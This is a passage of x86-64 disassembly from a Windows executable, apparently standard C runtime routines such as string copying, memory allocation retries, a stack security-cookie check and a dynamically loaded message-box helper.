   1400042df:	c3                   	ret
   1400042e0:	48 8d 44 01 fb       	lea    -0x5(%rcx,%rax,1),%rax
   1400042e5:	c3                   	ret
   1400042e6:	48 8d 44 01 fa       	lea    -0x6(%rcx,%rax,1),%rax
   1400042eb:	c3                   	ret
   1400042ec:	48 8d 44 01 f9       	lea    -0x7(%rcx,%rax,1),%rax
   1400042f1:	c3                   	ret
   1400042f2:	48 8d 44 01 f8       	lea    -0x8(%rcx,%rax,1),%rax
   1400042f7:	c3                   	ret
   1400042f8:	40 53                	rex push %rbx
   1400042fa:	55                   	push   %rbp
   1400042fb:	56                   	push   %rsi
   1400042fc:	57                   	push   %rdi
   1400042fd:	41 54                	push   %r12
   1400042ff:	41 55                	push   %r13
   140004301:	41 56                	push   %r14
   140004303:	48 83 ec 50          	sub    $0x50,%rsp
   140004307:	48 8b 05 62 71 00 00 	mov    0x7162(%rip),%rax        # 0x14000b470
   14000430e:	48 33 c4             	xor    %rsp,%rax
   140004311:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004316:	41 8b e8             	mov    %r8d,%ebp
   140004319:	4c 8b f2             	mov    %rdx,%r14
   14000431c:	4c 8b e9             	mov    %rcx,%r13
   14000431f:	e8 0c f1 ff ff       	call   0x140003430
   140004324:	33 db                	xor    %ebx,%ebx
   140004326:	48 39 1d 73 88 00 00 	cmp    %rbx,0x8873(%rip)        # 0x14000cba0
   14000432d:	48 8b f8             	mov    %rax,%rdi
   140004330:	0f 85 d5 00 00 00    	jne    0x14000440b
   140004336:	48 8d 0d 1b 4d 00 00 	lea    0x4d1b(%rip),%rcx        # 0x140009058
   14000433d:	ff 15 cd 3d 00 00    	call   *0x3dcd(%rip)        # 0x140008110
   140004343:	48 8b f0             	mov    %rax,%rsi
   140004346:	48 85 c0             	test   %rax,%rax
   140004349:	0f 84 93 01 00 00    	je     0x1400044e2
   14000434f:	48 8d 15 f2 4c 00 00 	lea    0x4cf2(%rip),%rdx        # 0x140009048
   140004356:	48 8b c8             	mov    %rax,%rcx
   140004359:	ff 15 01 3e 00 00    	call   *0x3e01(%rip)        # 0x140008160
   14000435f:	48 85 c0             	test   %rax,%rax
   140004362:	0f 84 7a 01 00 00    	je     0x1400044e2
   140004368:	48 8b c8             	mov    %rax,%rcx
   14000436b:	ff 15 0f 3e 00 00    	call   *0x3e0f(%rip)        # 0x140008180
   140004371:	48 8d 15 c0 4c 00 00 	lea    0x4cc0(%rip),%rdx        # 0x140009038
   140004378:	48 8b ce             	mov    %rsi,%rcx
   14000437b:	48 89 05 1e 88 00 00 	mov    %rax,0x881e(%rip)        # 0x14000cba0
   140004382:	ff 15 d8 3d 00 00    	call   *0x3dd8(%rip)        # 0x140008160
   140004388:	48 8b c8             	mov    %rax,%rcx
   14000438b:	ff 15 ef 3d 00 00    	call   *0x3def(%rip)        # 0x140008180
   140004391:	48 8d 15 88 4c 00 00 	lea    0x4c88(%rip),%rdx        # 0x140009020
   140004398:	48 8b ce             	mov    %rsi,%rcx
   14000439b:	48 89 05 06 88 00 00 	mov    %rax,0x8806(%rip)        # 0x14000cba8
   1400043a2:	ff 15 b8 3d 00 00    	call   *0x3db8(%rip)        # 0x140008160
   1400043a8:	48 8b c8             	mov    %rax,%rcx
   1400043ab:	ff 15 cf 3d 00 00    	call   *0x3dcf(%rip)        # 0x140008180
   1400043b1:	48 8d 15 48 4c 00 00 	lea    0x4c48(%rip),%rdx        # 0x140009000
   1400043b8:	48 8b ce             	mov    %rsi,%rcx
   1400043bb:	48 89 05 ee 87 00 00 	mov    %rax,0x87ee(%rip)        # 0x14000cbb0
   1400043c2:	ff 15 98 3d 00 00    	call   *0x3d98(%rip)        # 0x140008160
   1400043c8:	48 8b c8             	mov    %rax,%rcx
   1400043cb:	ff 15 af 3d 00 00    	call   *0x3daf(%rip)        # 0x140008180
   1400043d1:	4c 8b d8             	mov    %rax,%r11
   1400043d4:	48 89 05 e5 87 00 00 	mov    %rax,0x87e5(%rip)        # 0x14000cbc0
   1400043db:	48 85 c0             	test   %rax,%rax
   1400043de:	74 22                	je     0x140004402
   1400043e0:	48 8d 15 01 4c 00 00 	lea    0x4c01(%rip),%rdx        # 0x140008fe8
   1400043e7:	48 8b ce             	mov    %rsi,%rcx
   1400043ea:	ff 15 70 3d 00 00    	call   *0x3d70(%rip)        # 0x140008160
   1400043f0:	48 8b c8             	mov    %rax,%rcx
   1400043f3:	ff 15 87 3d 00 00    	call   *0x3d87(%rip)        # 0x140008180
   1400043f9:	48 89 05 b8 87 00 00 	mov    %rax,0x87b8(%rip)        # 0x14000cbb8
   140004400:	eb 10                	jmp    0x140004412
   140004402:	48 8b 05 af 87 00 00 	mov    0x87af(%rip),%rax        # 0x14000cbb8
   140004409:	eb 0e                	jmp    0x140004419
   14000440b:	48 8b 05 a6 87 00 00 	mov    0x87a6(%rip),%rax        # 0x14000cbb8
   140004412:	4c 8b 1d a7 87 00 00 	mov    0x87a7(%rip),%r11        # 0x14000cbc0
   140004419:	48 3b c7             	cmp    %rdi,%rax
   14000441c:	74 62                	je     0x140004480
   14000441e:	4c 3b df             	cmp    %rdi,%r11
   140004421:	74 5d                	je     0x140004480
   140004423:	48 8b c8             	mov    %rax,%rcx
   140004426:	ff 15 3c 3d 00 00    	call   *0x3d3c(%rip)        # 0x140008168
   14000442c:	48 8b 0d 8d 87 00 00 	mov    0x878d(%rip),%rcx        # 0x14000cbc0
   140004433:	48 8b f0             	mov    %rax,%rsi
   140004436:	ff 15 2c 3d 00 00    	call   *0x3d2c(%rip)        # 0x140008168
   14000443c:	4c 8b e0             	mov    %rax,%r12
   14000443f:	48 85 f6             	test   %rsi,%rsi
   140004442:	74 3c                	je     0x140004480
   140004444:	48 85 c0             	test   %rax,%rax
   140004447:	74 37                	je     0x140004480
   140004449:	ff d6                	call   *%rsi
   14000444b:	48 85 c0             	test   %rax,%rax
   14000444e:	74 2a                	je     0x14000447a
   140004450:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004455:	41 b9 0c 00 00 00    	mov    $0xc,%r9d
   14000445b:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140004460:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004465:	41 8d 51 f5          	lea    -0xb(%r9),%edx
   140004469:	48 8b c8             	mov    %rax,%rcx
   14000446c:	41 ff d4             	call   *%r12
   14000446f:	85 c0                	test   %eax,%eax
   140004471:	74 07                	je     0x14000447a
   140004473:	f6 44 24 40 01       	testb  $0x1,0x40(%rsp)
   140004478:	75 06                	jne    0x140004480
   14000447a:	0f ba ed 15          	bts    $0x15,%ebp
   14000447e:	eb 40                	jmp    0x1400044c0
   140004480:	48 8b 0d 21 87 00 00 	mov    0x8721(%rip),%rcx        # 0x14000cba8
   140004487:	48 3b cf             	cmp    %rdi,%rcx
   14000448a:	74 34                	je     0x1400044c0
   14000448c:	ff 15 d6 3c 00 00    	call   *0x3cd6(%rip)        # 0x140008168
   140004492:	48 85 c0             	test   %rax,%rax
   140004495:	74 29                	je     0x1400044c0
   140004497:	ff d0                	call   *%rax
   140004499:	48 8b d8             	mov    %rax,%rbx
   14000449c:	48 85 c0             	test   %rax,%rax
   14000449f:	74 1f                	je     0x1400044c0
   1400044a1:	48 8b 0d 08 87 00 00 	mov    0x8708(%rip),%rcx        # 0x14000cbb0
   1400044a8:	48 3b cf             	cmp    %rdi,%rcx
   1400044ab:	74 13                	je     0x1400044c0
   1400044ad:	ff 15 b5 3c 00 00    	call   *0x3cb5(%rip)        # 0x140008168
   1400044b3:	48 85 c0             	test   %rax,%rax
   1400044b6:	74 08                	je     0x1400044c0
   1400044b8:	48 8b cb             	mov    %rbx,%rcx
   1400044bb:	ff d0                	call   *%rax
   1400044bd:	48 8b d8             	mov    %rax,%rbx
   1400044c0:	48 8b 0d d9 86 00 00 	mov    0x86d9(%rip),%rcx        # 0x14000cba0
   1400044c7:	ff 15 9b 3c 00 00    	call   *0x3c9b(%rip)        # 0x140008168
   1400044cd:	48 85 c0             	test   %rax,%rax
   1400044d0:	74 10                	je     0x1400044e2
   1400044d2:	44 8b cd             	mov    %ebp,%r9d
   1400044d5:	4d 8b c6             	mov    %r14,%r8
   1400044d8:	49 8b d5             	mov    %r13,%rdx
   1400044db:	48 8b cb             	mov    %rbx,%rcx
   1400044de:	ff d0                	call   *%rax
   1400044e0:	eb 02                	jmp    0x1400044e4
   1400044e2:	33 c0                	xor    %eax,%eax
   1400044e4:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400044e9:	48 33 cc             	xor    %rsp,%rcx
   1400044ec:	e8 3f 02 00 00       	call   0x140004730
   1400044f1:	48 83 c4 50          	add    $0x50,%rsp
   1400044f5:	41 5e                	pop    %r14
   1400044f7:	41 5d                	pop    %r13
   1400044f9:	41 5c                	pop    %r12
   1400044fb:	5f                   	pop    %rdi
   1400044fc:	5e                   	pop    %rsi
   1400044fd:	5d                   	pop    %rbp
   1400044fe:	5b                   	pop    %rbx
   1400044ff:	c3                   	ret
   140004500:	40 53                	rex push %rbx
   140004502:	48 83 ec 20          	sub    $0x20,%rsp
   140004506:	45 33 d2             	xor    %r10d,%r10d
   140004509:	4c 8b c9             	mov    %rcx,%r9
   14000450c:	48 85 c9             	test   %rcx,%rcx
   14000450f:	74 0e                	je     0x14000451f
   140004511:	48 85 d2             	test   %rdx,%rdx
   140004514:	74 09                	je     0x14000451f
   140004516:	4d 85 c0             	test   %r8,%r8
   140004519:	75 1d                	jne    0x140004538
   14000451b:	66 44 89 11          	mov    %r10w,(%rcx)
   14000451f:	e8 b8 db ff ff       	call   0x1400020dc
   140004524:	bb 16 00 00 00       	mov    $0x16,%ebx
   140004529:	89 18                	mov    %ebx,(%rax)
   14000452b:	e8 f8 f4 ff ff       	call   0x140003a28
   140004530:	8b c3                	mov    %ebx,%eax
   140004532:	48 83 c4 20          	add    $0x20,%rsp
   140004536:	5b                   	pop    %rbx
   140004537:	c3                   	ret
   140004538:	66 44 39 11          	cmp    %r10w,(%rcx)
   14000453c:	74 09                	je     0x140004547
   14000453e:	48 83 c1 02          	add    $0x2,%rcx
   140004542:	48 ff ca             	dec    %rdx
   140004545:	75 f1                	jne    0x140004538
   140004547:	48 85 d2             	test   %rdx,%rdx
   14000454a:	75 06                	jne    0x140004552
   14000454c:	66 45 89 11          	mov    %r10w,(%r9)
   140004550:	eb cd                	jmp    0x14000451f
   140004552:	49 2b c8             	sub    %r8,%rcx
   140004555:	41 0f b7 00          	movzwl (%r8),%eax
   140004559:	66 42 89 04 01       	mov    %ax,(%rcx,%r8,1)
   14000455e:	49 83 c0 02          	add    $0x2,%r8
   140004562:	66 85 c0             	test   %ax,%ax
   140004565:	74 05                	je     0x14000456c
   140004567:	48 ff ca             	dec    %rdx
   14000456a:	75 e9                	jne    0x140004555
   14000456c:	48 85 d2             	test   %rdx,%rdx
   14000456f:	75 10                	jne    0x140004581
   140004571:	66 45 89 11          	mov    %r10w,(%r9)
   140004575:	e8 62 db ff ff       	call   0x1400020dc
   14000457a:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000457f:	eb a8                	jmp    0x140004529
   140004581:	33 c0                	xor    %eax,%eax
   140004583:	eb ad                	jmp    0x140004532
   140004585:	cc                   	int3
   140004586:	cc                   	int3
   140004587:	cc                   	int3
   140004588:	40 53                	rex push %rbx
   14000458a:	48 83 ec 20          	sub    $0x20,%rsp
   14000458e:	33 db                	xor    %ebx,%ebx
   140004590:	4d 8b d0             	mov    %r8,%r10
   140004593:	4d 85 c9             	test   %r9,%r9
   140004596:	75 0e                	jne    0x1400045a6
   140004598:	48 85 c9             	test   %rcx,%rcx
   14000459b:	75 0e                	jne    0x1400045ab
   14000459d:	48 85 d2             	test   %rdx,%rdx
   1400045a0:	75 20                	jne    0x1400045c2
   1400045a2:	33 c0                	xor    %eax,%eax
   1400045a4:	eb 2f                	jmp    0x1400045d5
   1400045a6:	48 85 c9             	test   %rcx,%rcx
   1400045a9:	74 17                	je     0x1400045c2
   1400045ab:	48 85 d2             	test   %rdx,%rdx
   1400045ae:	74 12                	je     0x1400045c2
   1400045b0:	4d 85 c9             	test   %r9,%r9
   1400045b3:	75 05                	jne    0x1400045ba
   1400045b5:	66 89 19             	mov    %bx,(%rcx)
   1400045b8:	eb e8                	jmp    0x1400045a2
   1400045ba:	4d 85 c0             	test   %r8,%r8
   1400045bd:	75 1c                	jne    0x1400045db
   1400045bf:	66 89 19             	mov    %bx,(%rcx)
   1400045c2:	e8 15 db ff ff       	call   0x1400020dc
   1400045c7:	bb 16 00 00 00       	mov    $0x16,%ebx
   1400045cc:	89 18                	mov    %ebx,(%rax)
   1400045ce:	e8 55 f4 ff ff       	call   0x140003a28
   1400045d3:	8b c3                	mov    %ebx,%eax
   1400045d5:	48 83 c4 20          	add    $0x20,%rsp
   1400045d9:	5b                   	pop    %rbx
   1400045da:	c3                   	ret
   1400045db:	4c 8b d9             	mov    %rcx,%r11
   1400045de:	4c 8b c2             	mov    %rdx,%r8
   1400045e1:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   1400045e5:	75 1c                	jne    0x140004603
   1400045e7:	4d 2b da             	sub    %r10,%r11
   1400045ea:	41 0f b7 02          	movzwl (%r10),%eax
   1400045ee:	66 43 89 04 13       	mov    %ax,(%r11,%r10,1)
   1400045f3:	49 83 c2 02          	add    $0x2,%r10
   1400045f7:	66 85 c0             	test   %ax,%ax
   1400045fa:	74 2f                	je     0x14000462b
   1400045fc:	49 ff c8             	dec    %r8
   1400045ff:	75 e9                	jne    0x1400045ea
   140004601:	eb 28                	jmp    0x14000462b
   140004603:	4c 2b d1             	sub    %rcx,%r10
   140004606:	43 0f b7 04 1a       	movzwl (%r10,%r11,1),%eax
   14000460b:	66 41 89 03          	mov    %ax,(%r11)
   14000460f:	49 83 c3 02          	add    $0x2,%r11
   140004613:	66 85 c0             	test   %ax,%ax
   140004616:	74 0a                	je     0x140004622
   140004618:	49 ff c8             	dec    %r8
   14000461b:	74 05                	je     0x140004622
   14000461d:	49 ff c9             	dec    %r9
   140004620:	75 e4                	jne    0x140004606
   140004622:	4d 85 c9             	test   %r9,%r9
   140004625:	75 04                	jne    0x14000462b
   140004627:	66 41 89 1b          	mov    %bx,(%r11)
   14000462b:	4d 85 c0             	test   %r8,%r8
   14000462e:	0f 85 6e ff ff ff    	jne    0x1400045a2
   140004634:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   140004638:	75 0b                	jne    0x140004645
   14000463a:	66 89 5c 51 fe       	mov    %bx,-0x2(%rcx,%rdx,2)
   14000463f:	41 8d 40 50          	lea    0x50(%r8),%eax
   140004643:	eb 90                	jmp    0x1400045d5
   140004645:	66 89 19             	mov    %bx,(%rcx)
   140004648:	e8 8f da ff ff       	call   0x1400020dc
   14000464d:	bb 22 00 00 00       	mov    $0x22,%ebx
   140004652:	e9 75 ff ff ff       	jmp    0x1400045cc
   140004657:	cc                   	int3
   140004658:	48 8b c1             	mov    %rcx,%rax
   14000465b:	0f b7 10             	movzwl (%rax),%edx
   14000465e:	48 83 c0 02          	add    $0x2,%rax
   140004662:	66 85 d2             	test   %dx,%dx
   140004665:	75 f4                	jne    0x14000465b
   140004667:	48 2b c1             	sub    %rcx,%rax
   14000466a:	48 d1 f8             	sar    $1,%rax
   14000466d:	48 ff c8             	dec    %rax
   140004670:	c3                   	ret
   140004671:	cc                   	int3
   140004672:	cc                   	int3
   140004673:	cc                   	int3
   140004674:	40 53                	rex push %rbx
   140004676:	48 83 ec 20          	sub    $0x20,%rsp
   14000467a:	45 33 d2             	xor    %r10d,%r10d
   14000467d:	4c 8b c9             	mov    %rcx,%r9
   140004680:	48 85 c9             	test   %rcx,%rcx
   140004683:	74 0e                	je     0x140004693
   140004685:	48 85 d2             	test   %rdx,%rdx
   140004688:	74 09                	je     0x140004693
   14000468a:	4d 85 c0             	test   %r8,%r8
   14000468d:	75 1d                	jne    0x1400046ac
   14000468f:	66 44 89 11          	mov    %r10w,(%rcx)
   140004693:	e8 44 da ff ff       	call   0x1400020dc
   140004698:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000469d:	89 18                	mov    %ebx,(%rax)
   14000469f:	e8 84 f3 ff ff       	call   0x140003a28
   1400046a4:	8b c3                	mov    %ebx,%eax
   1400046a6:	48 83 c4 20          	add    $0x20,%rsp
   1400046aa:	5b                   	pop    %rbx
   1400046ab:	c3                   	ret
   1400046ac:	49 2b c8             	sub    %r8,%rcx
   1400046af:	41 0f b7 00          	movzwl (%r8),%eax
   1400046b3:	66 42 89 04 01       	mov    %ax,(%rcx,%r8,1)
   1400046b8:	49 83 c0 02          	add    $0x2,%r8
   1400046bc:	66 85 c0             	test   %ax,%ax
   1400046bf:	74 05                	je     0x1400046c6
   1400046c1:	48 ff ca             	dec    %rdx
   1400046c4:	75 e9                	jne    0x1400046af
   1400046c6:	48 85 d2             	test   %rdx,%rdx
   1400046c9:	75 10                	jne    0x1400046db
   1400046cb:	66 45 89 11          	mov    %r10w,(%r9)
   1400046cf:	e8 08 da ff ff       	call   0x1400020dc
   1400046d4:	bb 22 00 00 00       	mov    $0x22,%ebx
   1400046d9:	eb c2                	jmp    0x14000469d
   1400046db:	33 c0                	xor    %eax,%eax
   1400046dd:	eb c7                	jmp    0x1400046a6
   1400046df:	cc                   	int3
   1400046e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400046e4:	85 c9                	test   %ecx,%ecx
   1400046e6:	78 20                	js     0x140004708
   1400046e8:	83 f9 02             	cmp    $0x2,%ecx
   1400046eb:	7e 0d                	jle    0x1400046fa
   1400046ed:	83 f9 03             	cmp    $0x3,%ecx
   1400046f0:	75 16                	jne    0x140004708
   1400046f2:	8b 05 70 79 00 00    	mov    0x7970(%rip),%eax        # 0x14000c068
   1400046f8:	eb 21                	jmp    0x14000471b
   1400046fa:	8b 05 68 79 00 00    	mov    0x7968(%rip),%eax        # 0x14000c068
   140004700:	89 0d 62 79 00 00    	mov    %ecx,0x7962(%rip)        # 0x14000c068
   140004706:	eb 13                	jmp    0x14000471b
   140004708:	e8 cf d9 ff ff       	call   0x1400020dc
   14000470d:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004713:	e8 10 f3 ff ff       	call   0x140003a28
   140004718:	83 c8 ff             	or     $0xffffffff,%eax
   14000471b:	48 83 c4 28          	add    $0x28,%rsp
   14000471f:	c3                   	ret
   140004720:	cc                   	int3
   140004721:	cc                   	int3
   140004722:	cc                   	int3
   140004723:	cc                   	int3
   140004724:	cc                   	int3
   140004725:	cc                   	int3
   140004726:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000472d:	00 00 00 
   140004730:	48 3b 0d 39 6d 00 00 	cmp    0x6d39(%rip),%rcx        # 0x14000b470
   140004737:	75 11                	jne    0x14000474a
   140004739:	48 c1 c1 10          	rol    $0x10,%rcx
   14000473d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140004742:	75 02                	jne    0x140004746
   140004744:	f3 c3                	repz ret
   140004746:	48 c1 c9 10          	ror    $0x10,%rcx
   14000474a:	e9 45 13 00 00       	jmp    0x140005a94
   14000474f:	cc                   	int3
   140004750:	cc                   	int3
   140004751:	cc                   	int3
   140004752:	cc                   	int3
   140004753:	cc                   	int3
   140004754:	cc                   	int3
   140004755:	cc                   	int3
   140004756:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000475d:	00 00 00 
   140004760:	48 81 ec d8 04 00 00 	sub    $0x4d8,%rsp
   140004767:	4d 33 c0             	xor    %r8,%r8
   14000476a:	4d 33 c9             	xor    %r9,%r9
   14000476d:	48 89 64 24 20       	mov    %rsp,0x20(%rsp)
   140004772:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140004777:	e8 e2 20 00 00       	call   0x14000685e
   14000477c:	48 81 c4 d8 04 00 00 	add    $0x4d8,%rsp
   140004783:	c3                   	ret
   140004784:	cc                   	int3
   140004785:	cc                   	int3
   140004786:	cc                   	int3
   140004787:	cc                   	int3
   140004788:	cc                   	int3
   140004789:	cc                   	int3
   14000478a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004790:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004795:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   14000479a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   14000479f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   1400047a6:	eb 08                	jmp    0x1400047b0
   1400047a8:	cc                   	int3
   1400047a9:	cc                   	int3
   1400047aa:	cc                   	int3
   1400047ab:	cc                   	int3
   1400047ac:	cc                   	int3
   1400047ad:	cc                   	int3
   1400047ae:	66 90                	xchg   %ax,%ax
   1400047b0:	c3                   	ret
   1400047b1:	cc                   	int3
   1400047b2:	cc                   	int3
   1400047b3:	cc                   	int3
   1400047b4:	cc                   	int3
   1400047b5:	cc                   	int3
   1400047b6:	cc                   	int3
   1400047b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400047be:	00 00 
   1400047c0:	c3                   	ret
   1400047c1:	cc                   	int3
   1400047c2:	cc                   	int3
   1400047c3:	cc                   	int3
   1400047c4:	48 8b c4             	mov    %rsp,%rax
   1400047c7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400047cb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400047cf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400047d3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400047d7:	41 54                	push   %r12
   1400047d9:	48 83 ec 20          	sub    $0x20,%rsp
   1400047dd:	8b 3d e5 83 00 00    	mov    0x83e5(%rip),%edi        # 0x14000cbc8
   1400047e3:	33 ed                	xor    %ebp,%ebp
   1400047e5:	48 8b f1             	mov    %rcx,%rsi
   1400047e8:	41 83 cc ff          	or     $0xffffffff,%r12d
   1400047ec:	48 8b ce             	mov    %rsi,%rcx
   1400047ef:	e8 38 d6 ff ff       	call   0x140001e2c
   1400047f4:	48 8b d8             	mov    %rax,%rbx
   1400047f7:	48 85 c0             	test   %rax,%rax
   1400047fa:	75 28                	jne    0x140004824
   1400047fc:	85 ff                	test   %edi,%edi
   1400047fe:	74 24                	je     0x140004824
   140004800:	8b cd                	mov    %ebp,%ecx
   140004802:	ff 15 f0 38 00 00    	call   *0x38f0(%rip)        # 0x1400080f8
   140004808:	8b 3d ba 83 00 00    	mov    0x83ba(%rip),%edi        # 0x14000cbc8
   14000480e:	44 8d 9d e8 03 00 00 	lea    0x3e8(%rbp),%r11d
   140004815:	44 3b df             	cmp    %edi,%r11d
   140004818:	41 8b eb             	mov    %r11d,%ebp
   14000481b:	41 0f 47 ec          	cmova  %r12d,%ebp
   14000481f:	41 3b ec             	cmp    %r12d,%ebp
   140004822:	75 c8                	jne    0x1400047ec
   140004824:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004829:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000482e:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140004833:	48 8b c3             	mov    %rbx,%rax
   140004836:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000483b:	48 83 c4 20          	add    $0x20,%rsp
   14000483f:	41 5c                	pop    %r12
   140004841:	c3                   	ret
   140004842:	cc                   	int3
   140004843:	cc                   	int3
   140004844:	48 8b c4             	mov    %rsp,%rax
   140004847:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000484b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000484f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140004853:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004857:	41 54                	push   %r12
   140004859:	48 83 ec 20          	sub    $0x20,%rsp
   14000485d:	33 ff                	xor    %edi,%edi
   14000485f:	48 8b f2             	mov    %rdx,%rsi
   140004862:	48 8b e9             	mov    %rcx,%rbp
   140004865:	41 83 cc ff          	or     $0xffffffff,%r12d
   140004869:	45 33 c0             	xor    %r8d,%r8d
   14000486c:	48 8b d6             	mov    %rsi,%rdx
   14000486f:	48 8b cd             	mov    %rbp,%rcx
   140004872:	e8 69 13 00 00       	call   0x140005be0
   140004877:	48 8b d8             	mov    %rax,%rbx
   14000487a:	48 85 c0             	test   %rax,%rax
   14000487d:	75 2a                	jne    0x1400048a9
   14000487f:	39 05 43 83 00 00    	cmp    %eax,0x8343(%rip)        # 0x14000cbc8
   140004885:	76 22                	jbe    0x1400048a9
   140004887:	8b cf                	mov    %edi,%ecx
   140004889:	ff 15 69 38 00 00    	call   *0x3869(%rip)        # 0x1400080f8
   14000488f:	44 8d 9f e8 03 00 00 	lea    0x3e8(%rdi),%r11d
   140004896:	44 3b 1d 2b 83 00 00 	cmp    0x832b(%rip),%r11d        # 0x14000cbc8
   14000489d:	41 8b fb             	mov    %r11d,%edi
   1400048a0:	41 0f 47 fc          	cmova  %r12d,%edi
   1400048a4:	41 3b fc             	cmp    %r12d,%edi
   1400048a7:	75 c0                	jne    0x140004869
   1400048a9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400048ae:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400048b3:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400048b8:	48 8b c3             	mov    %rbx,%rax
   1400048bb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400048c0:	48 83 c4 20          	add    $0x20,%rsp
   1400048c4:	41 5c                	pop    %r12
   1400048c6:	c3                   	ret
   1400048c7:	cc                   	int3
   1400048c8:	48 8b c4             	mov    %rsp,%rax
   1400048cb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400048cf:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400048d3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400048d7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400048db:	41 54                	push   %r12
   1400048dd:	48 83 ec 20          	sub    $0x20,%rsp
   1400048e1:	33 f6                	xor    %esi,%esi
   1400048e3:	48 8b fa             	mov    %rdx,%rdi
   1400048e6:	48 8b e9             	mov    %rcx,%rbp
   1400048e9:	41 83 cc ff          	or     $0xffffffff,%r12d
   1400048ed:	48 8b d7             	mov    %rdi,%rdx
   1400048f0:	48 8b cd             	mov    %rbp,%rcx
   1400048f3:	e8 84 13 00 00       	call   0x140005c7c
   1400048f8:	48 8b d8             	mov    %rax,%rbx
   1400048fb:	48 85 c0             	test   %rax,%rax
   1400048fe:	75 2f                	jne    0x14000492f
   140004900:	48 85 ff             	test   %rdi,%rdi
   140004903:	74 2a                	je     0x14000492f
   140004905:	39 05 bd 82 00 00    	cmp    %eax,0x82bd(%rip)        # 0x14000cbc8
   14000490b:	76 22                	jbe    0x14000492f
   14000490d:	8b ce                	mov    %esi,%ecx
   14000490f:	ff 15 e3 37 00 00    	call   *0x37e3(%rip)        # 0x1400080f8
   140004915:	44 8d 9e e8 03 00 00 	lea    0x3e8(%rsi),%r11d
   14000491c:	44 3b 1d a5 82 00 00 	cmp    0x82a5(%rip),%r11d        # 0x14000cbc8
   140004923:	41 8b f3             	mov    %r11d,%esi
   140004926:	41 0f 47 f4          	cmova  %r12d,%esi
   14000492a:	41 3b f4             	cmp    %r12d,%esi
   14000492d:	75 be                	jne    0x1400048ed
   14000492f:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004934:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004939:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000493e:	48 8b c3             	mov    %rbx,%rax
   140004941:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004946:	48 83 c4 20          	add    $0x20,%rsp
   14000494a:	41 5c                	pop    %r12
   14000494c:	c3                   	ret
   14000494d:	cc                   	int3
   14000494e:	cc                   	int3
   14000494f:	cc                   	int3
   140004950:	cc                   	int3
   140004951:	cc                   	int3
   140004952:	cc                   	int3
   140004953:	cc                   	int3
   140004954:	cc                   	int3
   140004955:	cc                   	int3
   140004956:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000495d:	00 00 00 
   140004960:	4c 8b d9             	mov    %rcx,%r11
   140004963:	48 2b d1             	sub    %rcx,%rdx
   140004966:	0f 82 9e 01 00 00    	jb     0x140004b0a
   14000496c:	49 83 f8 08          	cmp    $0x8,%r8
   140004970:	72 61                	jb     0x1400049d3
   140004972:	f6 c1 07             	test   $0x7,%cl
   140004975:	74 36                	je     0x1400049ad
   140004977:	f6 c1 01             	test   $0x1,%cl
   14000497a:	74 0b                	je     0x140004987
   14000497c:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   14000497f:	49 ff c8             	dec    %r8
   140004982:	88 01                	mov    %al,(%rcx)
   140004984:	48 ff c1             	inc    %rcx
   140004987:	f6 c1 02             	test   $0x2,%cl
   14000498a:	74 0f                	je     0x14000499b
   14000498c:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   140004990:	49 83 e8 02          	sub    $0x2,%r8
   140004994:	66 89 01             	mov    %ax,(%rcx)
   140004997:	48 83 c1 02          	add    $0x2,%rcx
   14000499b:	f6 c1 04             	test   $0x4,%cl
   14000499e:	74 0d                	je     0x1400049ad
   1400049a0:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   1400049a3:	49 83 e8 04          	sub    $0x4,%r8
   1400049a7:	89 01                	mov    %eax,(%rcx)
   1400049a9:	48 83 c1 04          	add    $0x4,%rcx
   1400049ad:	4d 8b c8             	mov    %r8,%r9
   1400049b0:	49 c1 e9 05          	shr    $0x5,%r9
   1400049b4:	75 51                	jne    0x140004a07
